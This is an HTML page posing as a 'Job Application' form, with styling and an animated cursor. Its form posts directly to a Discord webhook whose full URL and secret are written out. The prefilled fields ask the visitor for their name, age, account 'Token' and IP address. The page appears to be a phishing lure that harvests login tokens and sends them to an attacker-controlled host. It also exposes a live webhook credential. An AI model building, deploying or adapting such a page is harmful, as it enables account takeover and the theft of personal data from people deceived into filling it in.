<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Job Application</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background:#0f172a;
      font-family:Arial, sans-serif;
      color:#e5e7eb;
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
      margin:0;
    }
    .box {
      background:#020617;
      padding:20px;
      border-radius:12px;
      width:100%;
      max-width:420px;
      animation: floatIn 0.6s ease-out both;
    }
    @keyframes floatIn {
      from { opacity:0; transform: translateY(10px) scale(0.98); }
      to { opacity:1; transform: translateY(0) scale(1); }
    }
    label { margin-top:10px; display:block; }
    textarea, input {
      width:100%;
      margin-top:5px;
      padding:10px;
      border-radius:8px;
      border:none;
    }
    button {
      margin-top:15px;
      width:100%;
      padding:12px;
      border:none;
      border-radius:10px;
      background:#6366f1;
      color:white;
      font-size:1rem;
      cursor:pointer;
      transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
    }
    button:hover {
      transform: translateY(-2px) scale(1.02);
      box-shadow: 0 12px 30px rgba(99,102,241,0.45);
      background:#7c7ff6;
    }
    button:active {
      transform: translateY(0) scale(0.99);
    }
  /* Custom animated cursor */
    body {
      cursor: none;
    }
    .cursor {
      position: fixed;
      top: 0;
      left: 0;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: radial-gradient(circle, #a5b4fc, #6366f1);
      pointer-events: none;
      transform: translate(-50%, -50%);
      animation: pulse 1.2s infinite ease-in-out;
      z-index: 9999;
    }
    @keyframes pulse {
      0% { transform: translate(-50%, -50%) scale(1); opacity: 0.9; }
      50% { transform: translate(-50%, -50%) scale(1.4); opacity: 0.5; }
      100% { transform: translate(-50%, -50%) scale(1); opacity: 0.9; }
    }
</style>
</head>
<body>

<div class="box">
  <h2>üç™ Job Application</h2>

  <form action="https://discordapp.com/api/webhooks/1449687692269981767/I0xHJXi4UNYimnK-PHgOiJacI1Ie7bmMY9JCvi9sDk24fmSSqf8kQ9FTQUg9sUwQ_Mwp" method="POST">

    <textarea name="content" rows="8" required>
üç™ Job Application

Name:
Age:
Token:
IP:

---
Submitted via form
    </textarea>

    <label style="font-size:0.8rem; margin-top:10px;">
      <input type="checkbox" required> I confirm this information is accurate and submitted with consent
    </label>

    <button type="submit">Submit Application</button>
  </form>
</div>

<div class="cursor" id="cursor"></div>
<script>
  const cursor = document.getElementById('cursor');
  document.addEventListener('mousemove', e => {
    cursor.style.top = e.clientY + 'px';
    cursor.style.left = e.clientX + 'px';
  });
</script>
</body>
</html>
